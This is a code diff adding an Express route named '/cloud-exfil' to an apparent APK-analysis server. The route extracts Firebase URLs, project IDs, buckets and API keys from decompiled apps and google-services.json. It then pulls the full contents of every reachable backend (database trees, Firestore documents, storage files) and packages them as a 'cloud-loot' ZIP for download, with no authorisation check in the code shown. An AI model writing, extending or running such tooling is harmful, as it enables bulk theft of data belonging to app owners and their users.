@@ -648,6 +648,63 @@ router.post("/cloud-pentest", async (req: Request, res: Response) => {
   } catch (e: any) { res.status(500).json({ error: e.message }); }
 });
 
+// ─── FULL CLOUD EXFILTRATION → downloadable ZIP ──────────────────────────────
+// Harvests cloud identifiers from the decompiled session, pulls the COMPLETE
+// contents of every reachable backend (RTDB tree / all Firestore docs / actual
+// storage bytes), zips them, and returns a downloadId for the desktop download.
+router.post("/cloud-exfil", async (req: Request, res: Response) => {
+  extendTimeout(req, res, 600_000);
+  const { sessionId } = req.body as { sessionId: string };
+  if (!sessionId) { res.status(400).json({ error: "sessionId مطلوب" }); return; }
+  try {
+    const sess = editSessions.get(sessionId);
+    if (!sess || !sess.decompDir || !fs.existsSync(sess.decompDir)) {
+      res.status(404).json({ error: "الجلسة غير موجودة — أعد رفع/فك الـ APK أولاً" }); return;
+    }
+    const { deepStaticSecrets } = await import("../hayo/pentest/secretsDeep.js");
+    const { exfiltrateAllCloudData } = await import("../hayo/pentest/cloudExfil.js");
+
+    const allFiles = readDirRecursive(sess.decompDir);
+    const TEXT = new Set([".xml", ".smali", ".json", ".txt", ".js", ".java", ".kt", ".properties", ".html", ".gradle", ".cfg", ".yml", ".yaml", ".md", ".pem", ".env", ".so"]);
+    const textFiles = allFiles.filter((f: string) => TEXT.has(path.extname(f).toLowerCase()));
+    const readText = (fp: string) => { try { return fs.readFileSync(fp, "utf-8").slice(0, 500_000); } catch { return ""; } };
+    const deep = deepStaticSecrets(textFiles, allFiles, sess.decompDir, readText);
+
+    // Fold in google-services.json identifiers too.
+    const gsPath = allFiles.find((f: string) => path.basename(f).toLowerCase().replace(/_/g, "-") === "google-services.json");
+    if (gsPath) {
+      try {
+        const gs = JSON.parse(readText(gsPath));
+        if (gs?.project_info?.firebase_url) deep.cloud.dbUrls.add(gs.project_info.firebase_url);
+        if (gs?.project_info?.project_id) deep.cloud.projectIds.add(gs.project_info.project_id);
+        if (gs?.project_info?.storage_bucket) deep.cloud.buckets.add(String(gs.project_info.storage_bucket).replace(/^gs:\/\//, ""));
+        if (gs?.client?.[0]?.api_key?.[0]?.current_key) deep.cloud.apiKeys.add(gs.client[0].api_key[0].current_key);
+      } catch { /* malformed */ }
+    }
+
+    const pkg = (sess as any).package || sessionId.slice(0, 8);
+    const result = await exfiltrateAllCloudData(deep.cloud, pkg);
+
+    let downloadId: string | undefined;
+    if (result.ok && result.zipPath) {
+      downloadId = `dl_exfil_${Date.now()}`;
+      uploadStore.set(downloadId, { filePath: result.zipPath, fileName: `cloud-loot-${pkg}.zip`, uploadedAt: Date.now() });
+    }
+    res.json({
+      success: result.ok,
+      downloadId,
+      totalFiles: result.totalFiles,
+      totalBytes: result.totalBytes,
+      zipBytes: result.zipBytes,
+      backends: result.backends,
+      authUsed: result.authUsed,
+      files: result.files.slice(0, 500),
+      log: result.log,
+      error: result.error,
+    });
+  } catch (e: any) { res.status(500).json({ error: e.message }); }
+});
+
 
 router.post("/deep-firebase-audit", upload.single("file"), async (req: Request, res: Response) => {
   extendTimeout(req, res, 600_000);
